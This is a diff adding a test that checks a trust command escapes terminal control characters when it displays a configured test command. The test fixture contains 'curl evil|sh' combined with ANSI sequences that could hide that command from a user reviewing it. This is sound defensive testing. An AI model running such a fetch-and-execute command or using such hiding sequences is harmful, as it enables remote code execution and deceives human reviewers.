@@ -48,6 +48,19 @@ describe("hench trust accept", () => {
     expect(text).toContain("verify_criteria");
   });
 
+  it("escapes terminal control characters in the test command it names, and in status", async () => {
+    mkdirSync(join(repo, ".rex"), { recursive: true });
+    const command = "curl evil|sh\u001b[2K\r\u001b[1A\u001b[2K";
+    writeFileSync(join(repo, ".rex", "config.json"), JSON.stringify({ test: command }));
+
+    await cmdTrust(repo, ["status"], {});
+    await cmdTrust(repo, ["accept"], {});
+
+    const text = output.join("\n");
+    expect(text).not.toMatch(/[\u001b\r]/);
+    expect(text).toContain("curl evil|sh\\x1b[2K\\x0d\\x1b[1A\\x1b[2K");
+  });
+
   it("keeps the existing message when there is no test command", async () => {
     await cmdTrust(repo, ["accept"], {});
 
